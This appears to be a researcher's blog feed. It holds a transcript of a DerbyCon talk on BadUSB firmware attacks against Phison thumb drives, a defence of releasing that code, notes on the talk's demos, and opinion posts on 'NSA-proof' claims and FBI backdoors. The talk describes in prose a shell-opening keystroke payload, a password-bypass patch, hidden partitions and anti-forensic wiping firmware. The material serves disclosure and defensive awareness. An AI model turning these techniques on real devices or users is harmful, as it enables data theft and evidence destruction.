<p><strong>Slide 12:</strong> (Brandon) Even <em>if</em> a device uses only signed updates, that&#8217;s not a guarantee that it&#8217;s safe. There are many ways that an update system can fail - and it&#8217;s important to remember that once these systems are developed, they tend to not be updated, so they are often using old or even obsolete technologies.</p>

<ul>
<li><p>Weak signing keys. Texas Instruments found this out the hard way, when their 512-bit RSA signing keys for their graphing calculator line were factored and publicly released, allowing anyone to release signed updates.</p></li>
<li><p>Verification failures. There have been some systems that use signing - but never bother to actually validate it.</p></li>
<li><p>Implementation failures. In one case, a system used string comparison to check if the hashes match - which worked great until there was a null byte in the hash (which is also used to indicate the end of a string in memory). This allowed attackers to steal a valid signature, with only a partial hash collision.</p></li>
<li><p>Exploitable code. If the signature check cannot be defeated, and I’ve had to do this, there are often ways to bypass it completely by taking advantage of vulnerabilities in poorly-written code.</p></li>
</ul>


<p><strong>Slide 13:</strong> (Brandon) To take advantage of all of these possibilities, an attacker has to perform some significant reverse engineering. Most of the products that are likely to be targeted, have little or no documentation - there are no spec sheets, no SDKs. It requires reverse engineering the firmware, and using that to document and understand how the hardware works, and then use that to identify how to add or change functionality.</p>

<p><strong>Slide 14:</strong> (Brandon) On thumbdrives, being able to update firmware opens the doors to many things, not just the composite device attacks, but also changes in device behavior that makes it all but impossible to know if the device is behaving in a trustworthy way.</p>

<p><strong>Slide 15:</strong> (Brandon) Thumbdrives are often used to transport sensitive information - but with modified firmware, it might not be doing what you think it is.</p>

<ul>
<li>Duplicating data to a hidden area for later retrieval</li>
<li>Instead of deleting files, copying it to a hidden area</li>
<li>Altering file contents when written - imagine writing a document to a drive, and later opening it to find that it says something else?</li>
<li>Inserting malware into executables. The first time an executable is read (by antivirus software), it appears legitimate, but the second time it’s read (for execution), it’s completely different.</li>
</ul>


<p>You can see where we are going here - once you can no longer trust the firmware of a device, you can&#8217;t trust that anything it does or tells you.</p>

<p><strong>Slide 16:</strong> (Brandon) A drive could also be modified to defeat forensic analysis. It&#8217;s common to connect a thumbdrive to a write-blocker to protect it - but a write-blocker can&#8217;t protect against the firmware.</p>

<p>Something we designed, but aren&#8217;t releasing, is modified firmware that expects to receive a special command from the PC it&#8217;s connected to - if that command isn&#8217;t received within the first few seconds, it then proceeds to erase the NAND, and destroy the firmware. Rendering the device unusable.</p>

<p>Within seconds of connecting it to a machine that doesn&#8217;t pass the secret command, the drive is toast. With this type of firmware, the only way to dump the data safely becomes dumping the NAND directly, without allowing the controller to have power. And by protecting the NAND by coating it in a hard substance like epoxy, even dumping the NAND becomes problematic.</p>

<p><strong>Slide 17:</strong> (Brandon) So, with all of that said - let&#8217;s take a look at BadUSB in action, with some of the code that we&#8217;ve made publicly available. After we see it in action, we&#8217;ll talk about where this research can go, and try to help you understand what the real risks are.</p>

<p><strong>Slide 18:</strong> (Brandon) This first demo is just the classic “show up as a keyboard and type out a bunch of commands automatically” scenario, which has been in the wild for many years through other devices such as the USB Rubber Ducky device, development boards, etc.</p>

<p>What this drive will do is type out a one-line PowerShell command that downloads an executable from a server and executes it. This executable will open a shell so others can connect and do various bad things.</p>

<p><strong>Slide 19:</strong> (Brandon) Next up, we&#8217;ll show you a patch to the existing firmware to add a new feature for data exfiltration - a hidden partition that&#8217;s only accessible via the right events.</p>

<p>The drive is divided in half, the first half of the drive shows up when you insert the device - if you look at it in &#8220;Disk Management&#8221; in Windows, you&#8217;ll only see half the size, format it - half the size, query the device - same thing, half the size. Everything looks and acts normal. Format it, do whatever you want. This is hidden entirely in firmware, so the host device doesn&#8217;t have a way to see what&#8217;s going on unless the right bit is flipped.</p>

<p>Until you eject the drive - not using the &#8220;safely remove hardware&#8217; option, but eject - after a few seconds it&#8217;ll re-enumerate and mount a hidden partition. You can dump whatever data you like here, and either unplug the drive, or hit eject again to get back to the first, original partition a few seconds later.</p>

<p>This is a really simple way to hide data on a drive that appears to be empty. I wouldn&#8217;t try to use it to get past the NSA, but it&#8217;ll pass most checks.</p>

<p><strong>Slide 20:</strong> (Brandon) Many drives support a mode that allows the contents to be protected by a user supplied password - until you enter the password, you can&#8217;t see the content of the drive.</p>

<p>We&#8217;ve made a very simple patch to the firmware that changes the way that the password change function works.</p>

<p>Normally you wouldn&#8217;t be able to access the contents of the drive without knowing the user&#8217;s password. With a simple change, we can change the password change function, so that it doesn&#8217;t verify that the old password is right - so you can take a drive that has password protected content, apply our patch, and change the password to something you know, without ever knowing the original password.</p>

<p>This shows how a simple change in unsigned firmware can drastically change the security profile of the device.</p>

<p>So we&#8217;ll take a drive, where I don&#8217;t know the password, and set the password to something new.</p>

<p><strong>Slide 21:</strong> (Brandon) – Here’s Adam to talk about where this research can go, and the implications and impacts of BadUSB.</p>

<p><strong>Slide 22:</strong> (Adam) So far, all we&#8217;ve been talking about is thumbdrives - but that&#8217;s just the beginning. How many people here knew that some keyboards and mice have user updateable firmware?</p>

<p>In 2009, K. Chen demonstrated an attack against Apple keyboards, it used the same technique behind BadUSB. Update the device with malicious firmware, have it open a reverse shell, win.</p>

<p>This was from 2009, and what we are seeing with BadUSB is just another take on the same issue.</p>

<p><strong>Slide 23:</strong> (Adam) This issue isn&#8217;t unique to thumb drives - many different devices are subject to the same issues. So many devices that are routinely and thoughtlessly connected to computers can be updated with malicious firmware.</p>

<p>Even better - many of these devices are installed in laptops, and connect over USB internally. So it&#8217;s possible that even internal peripherals could be attacked. The USB hubs integrated into motherboards are even a risk.</p>

<p>Now, I don&#8217;t say this to make you paranoid, but so you&#8217;ll have a better understanding of your attack surface. These devices are all around us, and any time one of them isn&#8217;t in our control, it could be reprogrammed by an attacker.</p>

<p>Keyboards, mice, printers, webcams, touchpads, Bluetooth adapters, SD card readers, USB hubs - almost anything that connects over USB could be attacked this way. The problem is, nobody knows what is vulnerable.</p>

<p>Devices aren&#8217;t labeled with what controller they use, and even for the same brand and model of a device, the controller used can vary. This makes it nearly impossible to determine what is and isn&#8217;t at risk to this type of attack.</p>

<p><strong>Slide 24:</strong> (Adam) Shortly after we released our code, I got a call from a reporter at Wired asking for more information. One of the topics that came up is, could this be used to build a firmware based worm.</p>

<p>After the question was asked, I sat in silence for a moment before responding - this is not only something we had thought of, but Brandon and I had spent hours discussing the possibility. At first, it was because we thought it could be the basis of a great talk - but then, it turned into a discussion of risks, was such research too risky.</p>

<p>I finally answered - yes, it&#8217;s possible, and we know how to do it.</p>

<p>This is the worst case scenario for BadUSB, a worm that infects the firmware of thumbdrives, and possibly other devices. Plugging an infected device into a machine could be enough to infect it, then it will spread from machine, to devices, to other machines. The devices could be made to be nearly impossible to clean - format the thumbdrives all you want, that won&#8217;t get rid of malware in the firmware. This is a scenario we hope to never be seen in the wild, but with an attacker with enough resources, it&#8217;s very possible.</p>

<p><strong>Slide 25:</strong> (Adam) This is clearly a problem, and very much a risk, on multiple fronts for secure environments - so how is this being addressed? For the most part, it isn&#8217;t. For me, there&#8217;s a striking similarity between the way these manufacturers are reacting to this, and the way ICS manufacturers responded to security issues prior to Stuxnet. They ignored the problem until something so dramatic, so important happened, that they couldn&#8217;t ignore it any longer.</p>

<p>I expect it&#8217;ll be the same with BadUSB - at some point there will be an event that drives the point home that this issue has to be addressed at the root of the problem - the massive number of devices with insecure firmware updates.</p>

<p><strong>Slide 26:</strong> (Adam) As Brandon said earlier, to pull of any of these attacks requires some significant reverse engineering work - if you have the right experience, it&#8217;s really not that hard. It does take quite a bit of time though. So, these are practical attacks, but there aren&#8217;t that many people that can do the work.</p>

<p><strong>Slide 27:</strong> (Adam) This is one of the most common questions, and the hardest to answer. Some of these attacks can be more easily performed with other hardware - the pre-programmed keyboard that opens a shell for example, can be done with a USB Rubber Ducky, an easy to acquire pen-testing tool that looks just like a thumbdrive, but is actually much more.</p>

<p>With USB development boards readily available, many things that are possible with BadUSB, are easier with better understood, well documented hardware. So, if an employee plugging in an unknown thumbdrive and it turning into a keyboard is a real risk in your environment - then BadUSB isn&#8217;t the problem you should be worried about.</p>

<p>Now, things like the integrity of data on the device, the modifications to how a thumbdrive operates, that&#8217;s a different issue, and one that&#8217;s harder to protect against. If the drive is ever out of your control, you can&#8217;t know if it&#8217;s trustable. I hate FUD as much as anyone, but if you have a device that anyone can update to operate in ways that you don&#8217;t want - if you ever lose control of it, you can&#8217;t know if it&#8217;s working for you or an attacker.</p>

<p>So, what&#8217;s the risk? It depends on how much people want what you have.</p>

<p><strong>Slide 28:</strong> (Adam) How many people here have policies that allow employees to use their own keyboard or mouse? OK, how many people think this happens even if it&#8217;s against policy?</p>

<p>When most people talk about BYOD policies, they aren&#8217;t thinking about the devices that connect to computers. But thanks to BadUSB, this is something that all companies should be thinking about - a user bringing in that Razer mouse they love so much, could actually be introducing a new attack vector, thanks to the updateable firmware.</p>

<p>I&#8217;m not going to recommend that companies ban all outside devices - but companies should be very aware of not just what&#8217;s on their network, but what&#8217;s connected to the things on their network. You can&#8217;t protect against what you don&#8217;t know about.</p>

<p>For a long time, “military grade encryption” has been a red flag for snake oil, over-hyped, under-performing garbage, so much so that it’s become a punchline. Anytime that phrase is seen, it’s assumed that the product is a joke - quite possibly doing more harm than good.</p>

<p>Since Snowden dropped his document cache, opening the world’s eyes to what’s been going on behind the scenes at what is likely the world’s most sophisticated attacker, NSA-Proof has become the new “military grade encryption” - marketing hype leading to instant ridicule by industry insiders. This phrase isn’t as simple though - the NSA isn’t a single dimensioned threat. So when talking about defenses, you have to think about not just avoiding the NSA, but avoiding the various attack classes they leverage.</p>

<h3>Fighting NSA Programs</h3>

<p>When people talk about resisting the NSA, what exactly does that mean? As the NSA runs many programs, we have to look at the programs to see what could (or couldn’t) be real resistance.</p>

<p><strong><a href="https://en.wikipedia.org/wiki/Tempora">Tempora</a></strong> (and similar projects) that tap backbone links, siphoning data en mass for later processing. Projects like this gather as much as possible, with no concern for who’s data they are looking at.</p>

<p>These efforts are passive, they see what’s going over the fiber, but without changing it. So encryption, even opportunistic (which I’m <a href="https://adamcaudill.com/2014/02/25/on-opportunistic-encryption/">really not a fan</a> of), prevents them from getting useful data. So TLS is NSA-Proof, from this very specific angle - it prevents them from <strong>passively</strong> collecting this data.</p>

<p><strong><a href="https://en.wikipedia.org/wiki/PRISM">PRISM</a></strong>, the infamous project whose exact role and function is still being debated. Metadata is king, <a href="http://abcnews.go.com/blogs/headlines/2014/05/ex-nsa-chief-we-kill-people-based-on-metadata/">metadata kills</a>. Metadata is easier to understand in bulk, and far easier to process than actual content for most (if not all) types of communication. Once you have enough of it, it’s far more valuable than the content it went with.</p>

<p>Want to protect against PRISM? Easy, kill all of the metadata. For a service provider, the less they know, the less they can be forced to hand-over. Email for example, is loaded with useful metadata, data that’s easily mined and correlated. Services and protocols that are being developed to be PRISM resistant are doing so by encrypting as much as possible, and minimizing the exposed metadata.</p>

<p>So, NSA-Proof is possible here as well, in a very specific angle. It’s harder to protect against than something like Tempora, but still doable with the right design.</p>

<p><strong><a href="https://en.wikipedia.org/wiki/Tailored_Access_Operations">TAO</a></strong> What about TAO, the NSA’s version of the special forces? Guarding against wide-scale NSA data collection is one thing, targeted activities are a different story.</p>

<p>I once suggested a <a href="https://adamcaudill.com/2013/09/06/making-android-nsa-proof/">method for making Android NSA-Proof</a> (it involves thermite, so it’s fun too!), and if you are targeted by TAO, that’s probably the best bet. There are ways you can make their job harder, but as long as they can figure out where you are, there’s always the <a href="http://arstechnica.com/information-technology/2013/12/inside-the-nsas-leaked-catalog-of-surveillance-magic/">implant</a> option.</p>

<p>So can you be NSA-Proof from TAO? Probably not. You can make your odds better, but if they are willing to put the effort in, sooner or later they’ll win unless you are very well funded, and willing to take extreme measures.</p>

<h3>Marketing Hype</h3>

<p>Many journalists use similar terms, ‘NSA proof’, ‘NSA resistant’, ‘thwarting the NSA’, and a hundred others. While there’s a good chance it’s just more snake oil, it’s possible that there may be <em>some</em> truth to it.</p>

<p>When dealing with an adversary like the NSA - you have to consider which part of the NSA. They are after everyone with mass data collection, which is something that can be fought - with a high likelihood of success. Though as the the targeting becomes more focused, the odds start dropping. Once TAO is involved, only the best funded have any hope of resisting.</p>

<p>If a service claims to be ‘NSA-Proof’ - it could be true, to a limited extent. Such claims really need to be qualified; if a service makes this kind of claim, they should provide information of which programs (or program types) they are trying to resist.</p>

<h3>So, what does NSA resistance actually require?</h3>

<p>This, obviously, isn’t an easy question and depends very much on the nature of the service. Though there are a few high-level things to look for:</p>

<ul>
<li>Strong, non-NSA backed crypto primitives. I’m a big fan of <a href="http://nacl.cr.yp.to/">NaCl</a> because it’s fast, constant-time, secure crypto that doesn’t rely on anything backed by the NSA. To make it easier to use, it’s made portable (and extended) in <a href="https://github.com/jedisct1/libsodium">libsodium</a>. I won’t promote anti-NIST FUD, but some things should be questioned, such as the NIST ECC curves.</li>
<li>Minimal metadata. The amount of information that can be extracted from messages should be at a minimum. Anything that’s exposed (username, user ID, public keys, etc.) can be used when collected en mass to begin mapping relationships and undoing the veil of anonymity.</li>
<li>Encrypt everything in transit. As with metadata, anything in the clear going over the network can be captured, stored, analyzed - and in targeted cases, altered in various ways. Using TLS is a great start to this, as it removes the option for simple passive monitoring, though it shouldn’t be assumed to be enough. Active attackers can man-in-the-middle the server, passing a forged/stolen certificate. Certificate pinning, and additional layers of encryption help protect against these attacks.</li>
<li>Server knows as little as possible. The more the server knows, the more the provider(s) can divulge - either by court order, or by more clandestine means. Even the simplest HTTP server logs can provide valuable information to such an attacker, especially when combined with other data sources.</li>
<li>Encrypt everything in storage. When at rest, everything should be encrypted - if a device is compromised, it should reveal as little as possible. By encrypting everything based on the user’s password, only the user is able to access the data (though may be by force).</li>
<li>Hide everything. The CIA at least once used a weather application to <a href="http://www.theguardian.com/world/2014/jul/09/germany-arrest-second-spy-accused-us-cia">hide a communication system</a>; it was only available when looking up weather for a certain city. Such techniques make it harder to spot the use of secure communication tools. This may seem a bit extreme, but there are good reasons to do it.</li>
</ul>


<p>There’s more of course, these are just a few high points. Defending against an adversary that has a huge budget, doesn’t respect international law, has a rubber stamp court, and some of the best technical talent in the world requires - special - measures. Of course, the NSA isn’t the only player; it goes beyond <a href="https://en.wikipedia.org/wiki/Five_Eyes">Five Eyes</a>, every major power engages in such activity to some extent.</p>

<p>If you can provide a reasonable degree of protection against PRISM &amp; <a href="https://en.wikipedia.org/wiki/United_States_Foreign_Intelligence_Surveillance_Court">FISC</a>, then you can expect to have equal odds with other players using the same attacks. Will it actually work? Who knows; there’s a lot that can go wrong, a lot of mistakes that can be made, so many ways a good intentioned developer can turn a secure system into a thin facade that offers no protection. The list above is a starting point, not the final requirements.</p>

<h3>Can it really be achieved?</h3>

<p>Achieving real resistance to illegal surveillance is a huge challenge, but at least some degree of success can be had by taking simple measures. Ensuring that everything possible is encrypted, that all network traffic is encrypted, and the like will make it far more of a challenge for an attacker.</p>

<p>TAO-level resistance probably isn’t realistic, but lower levels are a real option, and should be pursued whenever possible. While calling anything ‘NSA proof’ should be seen as a red flag, there are real techniques to resist the NSA and other agencies that seek to invade the privacy of the world.</p>

      <title>A backdoor by any other name&#8230;</title>
      <description><p>Yesterday James B. Comey, the Director of the FBI continued the propaganda campaign against encryption with a fresh batch of lies and misdirection. The FBI has been pushing to add backdoors to cryptosystems around the world - no matter how many people they put at risk in the process. Starting in the 1990’s, the FBI has been at the forefront of trying to make their job easier by endangering the world.</p>

<p>What Comey did today was to lay the foundation for a renewed push for a new, expansive, <a href="https://en.wikipedia.org/wiki/Communications_Assistance_for_Law_Enforcement_Act">CALEA</a> type law that would give <em>governments</em> access - via court orders or surreptitiously, to all of your data. In 2013 they were pushing for <a href="https://freedom-to-tinker.com/blog/felten/calea-ii-risks-of-wiretap-modifications-to-endpoints/">CALEA 2</a>, which would have expanded their ability to secretly access your data in a massive way. Thankfully the Snowden documents put an end to that - at least for awhile.</p>

<p>I use the term governments instead of specifying the US Government very intentionally. Under CALEA, certain systems must be compliant to be sold in the US - so companies add support, and then ship them all over the world instead of supporting two versions. So the FBI’s desire to have easy access to anything they want puts people around the world at risk. But surely nobody would abuse this, right?</p>

<p>In 2004, thanks to support for this type of “lawful intercept” support, <a href="https://en.wikipedia.org/wiki/Greek_wiretapping_case_2004%E2%80%9305">Vodaphone in Greece was hacked</a> - tapping top government and civil leaders. Who did it still isn’t known, but many suspect that the US Government was behind it. Then there’s <a href="https://firstlook.org/theintercept/2014/05/19/data-pirates-caribbean-nsa-recording-every-cell-phone-call-bahamas/">SOMALGET</a>, the NSA program to collect all calls made in the Bahamas. The DEA was given access to their phone systems for the purposes of “lawful intercept” - again, a CALEA compliant setup, which was then used to collect everything they were able to get. These are just two high profile examples, there are many cases where researchers have found flaws in these systems, making them easy prey.</p>

<p>For years, it’s been made clear that such backdoors were disasters - and it’s not just CALEA compliance either. There’s the infamous <a href="https://en.wikipedia.org/wiki/Clipper_chip">Clipper chip</a> which would encrypt voice calls, but allow the government to easily listen in - but thanks to fatal flaws, anyone else could as well.</p>

<p>Thanks to this, pretty much everybody agrees that backdoors are a bad idea, so the FBI had a great idea - call it something else!</p>

<h3>A rose by any other name…</h3>

<p>Comey, deciding that he shouldn’t have to deal with reality, and that the best way to address the public was misdirection:</p>

<blockquote><p>We aren’t seeking a back-door approach. We want to use the front door, with clarity and transparency, and with clear guidance provided by law.</p></blockquote>


<p>And by “front door”, he means some new backdoor into everything.</p>

<p>He wants the ability to decrypt data, without having to get information from the suspect; which means adding a backdoor to systems, to allow them - and likely many others to get in. This is no different than the disastrous Clipper chip idea.</p>

<p>The FBI is trying to misdirect the public, lead them to believe in some magical, secure backdoor that is abuse-proof. But when such an idea is being pushed by an organization that has so much abuse and illegal activity in its history - should anyone trust what they say?</p>

<h3>Putting enforcement first</h3>

<p>At one point Comey said something that I found shocking:</p>

<blockquote><p>Are we so mistrustful of government—and of law enforcement—that we are willing to let bad guys walk away&#8230;</p></blockquote>


<p>If you read the US Constitution, this is answered for him - in many places it is made clear, it’s better to let a criminal walk free than to infringe on the rights of the innocent. Preserving the rights of the people trumps everything.</p>

<p>For law enforcement, this isn’t about justice, or the rule of law - this is about their power, their ability to get what they want, when they want it. If they put people in harms way in the process, that’s a price they are willing to let the public pay.</p>

<h3>Only one government?</h3>

<p>In the discussions about this, one major point keeps being missed - this isn’t just about the US Government, but about the governments all around the world. If companies are forced to add backdoors to products for the US market, you can bet that same backdoor will be shipped to every country they work in.</p>

<p>So the danger is global - but as this is something that can be used for intelligence, as CALEA has been used for in the past, I’m sure this fact hasn’t escaped the attention of planners at the NSA. For the NSA, a CALEA 2 style law would give them easy access to expend their already vast - and illegal - collection operations. It would be a dream come true.</p>

<p>There’s also another international component to this issue - many major tech companies operate in several countries, making them subject to local courts. What happens when they receive a court order for access to this backdoor and a gag order, to prevent them from talking about it? Suddenly American data will be at risk from foreign powers.</p>

<p>There are so many issues opened up when backdoors are added, that one could talk for days and still not cover all the ways it could be abused.</p>

<h3>Lies and mistrust</h3>

<blockquote><p>Perhaps it’s time to suggest that the post-Snowden pendulum has swung too far in one direction—in a direction of fear and mistrust.</p></blockquote>


<p>It seems that Comey is surprised that people don’t trust the government, after lies, deception, and violations of law are revealed. How shocking.</p>

<p>The US Government has failed to uphold the Constitution, and technology companies have stepped up to provide a level of protection in the face of a Government that has ignored its obligations. I’m sure that the FBI would love to go back the old days - where we assume the government is doing the right thing while secretly violating the Constitution and ignoring international law. Anything to give them more power and control.</p>

<h3>The New Crypto Wars</h3>

<p>In the 1990s, the first crypto war was fought, and many believed that the public had won. What we are seeing is, without question, that a new war has started. Apple’s decision to change the way they encrypt phones wasn’t what started it - the writing had been on the walls for some time, it was just the ammunition they were waiting to go on the attack.</p>

<p>Those that work with cryptography daily fighting to protect users, while the government is busy trying to protect what they want, over the rights and protection of the people. Expect it to get ugly.</p>

<p>It’s going to be a fight, and what happens in the next year or two will be critical. If the FBI wins, privacy dies.</p>

<p><em>(Sorry for the ranty nature of this post - it’s an issue I feel strongly about, and something that we must take action on.)</em></p>

      <title>On The Ethics of BadUSB</title>
      <description><p>Last Friday, <a href="http://www.brandonw.net/">Brandon Wilson</a> and I gave a talk on BadUSB at DerbyCon - I wrote some <a href="https://adamcaudill.com/2014/10/02/making-badusb-work-for-you-derbycon/">about it yesterday</a>. Yesterday, Wired <a href="http://www.wired.com/2014/10/code-published-for-unfixable-usb-attack/">published</a> an article on the talk, kicking off several others - only the authors of the Wired and <a href="http://threatpost.com/badusb-attack-code-publicly-disclosed">Threatpost</a> articles contacted us for input.</p>

<p>There has been some questions raised as to the responsibility of releasing the code - so I want to take a few minutes to talk about what we released, why, and what the risks actually are.</p>

<h2>What we released.</h2>

<p>We released a two patches to the existing (v1.03.53) firmware for the Phison 2251-03, and a minimal custom firmware for that same chip.</p>

<p><strong>The Patches</strong></p>

<p>First, let me briefly describe the patches:</p>

<ul>
<li>Hidden Partition - A patch to create a second hidden partition, to show that data can be hidden, and not easily accessed unless you know the trick.</li>
<li>Password Bypass - A patch to modify the password protection mechanism to force the password to fixed value; so that any password will be accepted. Must be applied before the password is set by the user.</li>
</ul>


<p>The second patch does defeat a “security” mechanism on the device, though given that the patch must be applied before the password is set - it’s not a huge risk to users. We intentionally focused on changing behavior instead of adding composite devices, to show that the is more complex than what was displayed at the Black Hat talk.</p>

<p>So we’ve bypassed one security feature, and added a new feature.</p>

<p>The patches were carefully selected to make the point, while not endangering users.</p>

<p><strong>The Custom Firmware</strong></p>

<p>The custom firmware acts a HID device, typing out a pre-programmed payload when inserted to a computer. This is anything but new - this can be done with a <a href="https://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe">USB Rubber Ducky</a>, a <a href="https://www.pjrc.com/teensy/">Teensy</a>, or a number of other devices.</p>

<p>This was released to prove the point that the device could be reprogrammed to be something completely different. If this is a new threat to anyone - they are very out of the loop.</p>

<p><strong>The Tools</strong></p>

<p>We also released a few tools that we developed to apply patches and to make our lives easier during the effort. Most of what they do is available in other tools from Phison or the device manufactures; we built the tools we needed, so we didn’t have to use third-party tools or deal with the limitations of those tools.</p>

<h2>What we DIDN’T release</h2>

<p>Now that we’ve talked about what was released, let’s talk about what it isn’t.</p>

<p><strong>Self replication</strong> - There’s no self replication code anywhere, while it’s possible that it could be done, and we’ve talked about how to do it - it won’t be released.</p>

<p>I am confident that we (Brandon and I) could build a system that would infect PCs, then infect a significant percentage of thumb drives, and then infect other PCs - but, and this is a <em>big</em> but - what we released doesn’t make that easier in any significant way.</p>

<p>Your average script kiddy will never be able to do it; there’s only a small number of people that would be able to do the work needed to be able to pull it off - those people could already do it before we released what we did.</p>

<p>The threat of this happening is the same as it has always been.</p>

<p><strong>Malware</strong> - There’s nothing malicious about what we’ve released here. While we did release a patch to modify the password protection feature - that’s all it does. It doesn’t modify data, infect computers with anything, or anything of that nature.</p>

<p>It changes the way a feature works. That’s it. This is a change that anyone with the required skills could have made - by making it public, we are raising awareness that users shouldn’t blindly trust.</p>

<p><strong>The end of USB as we know it</strong> - Nothing, nothing, that we’ve released has suddenly made new attacks possible. The USB specification allows composite devices to do unexpected things. USB devices (thumb drives or otherwise) that allow anyone to update the firmware without any checks, means that anything can potentially be reprogrammed to change functionality or become malicious.</p>

<p>All of these things have been true long before we released the first line of code. Anyone that believes otherwise doesn’t understand the technology.</p>

<p><strong>An unfixable issue that will end the world</strong> - While there isn’t quick fix for this, things can be improved quite a bit. We released simple code, that proves the issue, draws attention to the fact that users need to be more careful, while being careful to not cause more harm than good in the process.</p>

<p>This isn’t earth shattering. Anyone that thinks that it is, should probably give up and go live in a cave.</p>

<h2>The Risks</h2>

<p>What are the real risks here - what does this expose users to that it didn’t in the past?</p>

<p>Writing code for these devices is far from easy, especially when trying to patch the existing firmware. It’s not something that just anyone can jump into - while we have made it easier for people to apply simple patches and provided some insight to the process, these aren’t the patches that will lead to a firmware based worm or something of that nature - these are the type of patches that will make small changes to existing features, or add simple new features. Even then, it’s time consuming and difficult work.</p>

<p>So, to do anything still requires a lot of knowledge and skill - in general, as I said earlier, the kind of people that have what it takes to do this, could do it regardless of our release.</p>

<p>If a person (or group) was so inclined to take one of these devices and make it truly malicious - it’s unlikely that our research would have an impact.</p>

<p>I firmly believe that by releasing this code, the risk to the average user isn’t increased at all over what it already was.</p>

<h2>Why release?</h2>

<p>Device manufactures were quick to dismiss the “BadUSB” threat - on one hand, what was presented at Black Hat was possible via other means, so wasn’t really a new threat - but they showed no indication of trying to address the issues under their control.</p>

<p>For years devices have been sold with updatable firmware, but with no security checks at all - we had two goals with the release of the code:</p>

<ul>
<li>User awareness - As long as users implicitly trust devices, attacks will be possible and successful.</li>
<li>Push device manufactures to implement signed updates.</li>
</ul>


<p>While it will take years for any changes made by device manufactures to have an impact because of the number of devices in circulation now - if they keep ignoring the issue, then it will never be improved.</p>

<p>In doing this, we haven’t broken the security of these devices, but made it clear that it isn’t existent. If anyone is upset that we’ve removed the obscurity that had “protected” these devices - then to them I’m sorry that they understand so little that they believe that it’s real protection.</p>

<p>Part of the reason we released the “hidden partition” patch was to show that this can be used to add new features, that can add value in certain cases.</p>

<h2>The Full Disclosure debate</h2>

<p>When we started on this, we were concerned that this was being touted as a new threat, yet for defenders there was no way they could even test it, much less develop defense techniques.</p>

<p>So not only do we have something that defenders can’t test, we have something that the device manufactures are downplaying or ignoring. This is the setup for the classic full disclosure debate.</p>

<p>The first question that we asked ourselves, before we wrote the first line of code, is what is best for users? To allow the status quo to continue, or to expand the research into new directions and publish - to help make users aware and provide defenders something to work with.</p>

<p>The answer we came up with, is that we could develop patches that would clearly communicate the issue, without causing undue harm to end users.</p>

<p>In the end, looking at what we intended to release, what could be done that wouldn’t have been possible before that (which is fairly minimal), and the potential benefit - we felt, and still do, that full disclosure was appropriate.</p>

<p>In everything we’ve done, the priority has been protecting users - any media report that indicates otherwise is ill-informed, and providing bad information to the public.</p>

<h2>Breaking out of the echo chamber</h2>

<p>Given that the issue was so well known, the amount of attention - positive and negative - that this has received has really surprised us. It’s too common that when something like this is released it stays within the infosec echo chamber - this has broken out far more than I expected.</p>

<p>Most of the negative feedback has been from people and organizations that are well outside of the echo chamber - reminding me of just how ignorant the public can be when it comes to technical issues.</p>

<p>There are times that I wonder why we work so hard to protect these people.</p>

<h2>Has this been blown out of proportion?</h2>

<p>Yes.</p>

      <title>Making BadUSB Work For You - DerbyCon</title>
      <description><p>Last week <a href="http://www.brandonw.net/">Brandon Wilson</a> and I were honored to speak at <a href="https://www.derbycon.com/">DerbyCon</a>, on the work we’ve been doing on the Phison controller found in many USB thumb drives. This was my first time speaking at DerbyCon - it’s a great event, with a fantastic team making the magic happen.</p>

<p>Slides:</p>

<iframe src="https://adamcaudill.com///www.slideshare.net/slideshow/embed_code/39583508" width="427" height="356" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe>


<p>Video (which I’ve haven’t been able to bring myself to watch):</p>

<iframe width="854" height="510" src="https://adamcaudill.com///www.youtube.com/embed/xcsxeJz3blI" frameborder="0" allowfullscreen></iframe>


<p>Now that the dust has settled, I would like to provide some updates, thoughts, and extra information - and <em>maybe</em> correct an error I made during the presentation.</p>

<h3>The Demos</h3>

<p>We did three demos - they were simple enough that I didn’t think there was any risk of having issues. Well, lesson learned.</p>

<p>The machine we used was a fresh Windows install just for the talk - though in the rush, there were a couple differences between it and the machine we had been testing with. In the panic of trying to get the talk done in the short 25-minute slot, I mistook these differences for a failing of one of the demos.</p>

<p><strong>Custom HID Firmware</strong></p>

<p>The first of the three demos was a completely custom firmware, that presents itself as a HID device (and as a mass storage device, though without media present - this is to make firmware updates easier) - the demo went without a hitch.</p>

<p>I would have liked to show the tools and the update process, though there just wasn’t time. Brandon is working on videos that will be posted to YouTube that walks through each demo step by step.</p>

<p>The team behind the <a href="https://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe">Rubber Ducky</a> saved us a lot of time, thanks to the tools they had built - as we were able to support the same encoded format they used.</p>

<p><strong>Hidden Partition</strong></p>

<p>The hidden partition is a great patch, as there’s no way to tell that it’s there - everything works as expected, no reason to suspect that anything has been altered.</p>

<p>It divides the NAND space into two partitions, and the firmware lies about the size, to indicate that only half of the space is there. The “public” section is the first that’s mounted, and only a specific action will cause the second, hidden partition to become visible.</p>

<p>It’s a simple change, but it sends a clear message that there can be more than meets the eye with these devices. From a forensics perspective, the only way to ensure that what you are getting is accurate and complete, is to dump the NAND directly - without allowing the controller to access it.</p>

<p><strong>Password Protection Bypass</strong></p>

<p>This demo <em>seemed</em> to go wrong, but it actually performed perfectly - I was just in too much of a rush to think though what was happening, and why I didn’t see what I expected.</p>

<p>When I plugged the device in, I was expecting to see two drives from it - one “public”, the other unmounted. I only saw one. Two things went wrong here:</p>

<ul>
<li>“Show Empty Drives In Explorer” - By default Windows doesn’t show unmounted removable drives in “My Computer”; this is a setting I always change, and expected to see the unmounted drive. As this was a fresh install, the default setting was still set - the drive was there, I just couldn’t see it. This threw me off.</li>
<li>Wrong Password - During the demo I typed in some random junk to the password field of the “Lock” tool, and instead of it unlocking the drive as expected, it gave me the wrong password dialog. The issue here is a bug in the Phison code, when supplying a password more than 16 characters long it treats it as a bad password. So it was working, but the password I supplied was too long, triggering that bug.</li>
</ul>


<p>We later tested that drive again, and sure enough - it worked flawlessly, as long as the random password wasn’t longer than 16 characters.</p>

<p>The patch works by altering the buffer that stores the data once received over USB; it forces it to 16 “A”s, so that any password will work. Because of how it works, the patch must be applied before the user sets their password - otherwise it’ll just make the data inaccessible.</p>

<p>That was painful.</p>

<h3>The (maybe) error…</h3>

<p>During the talk I referred to modes 7 and 8 as being encrypted - this is <em>probably</em> wrong, at least on the devices we demoed. The two modes are password protected, and according to some documentation are encrypted, and according to other documentation they aren’t.</p>

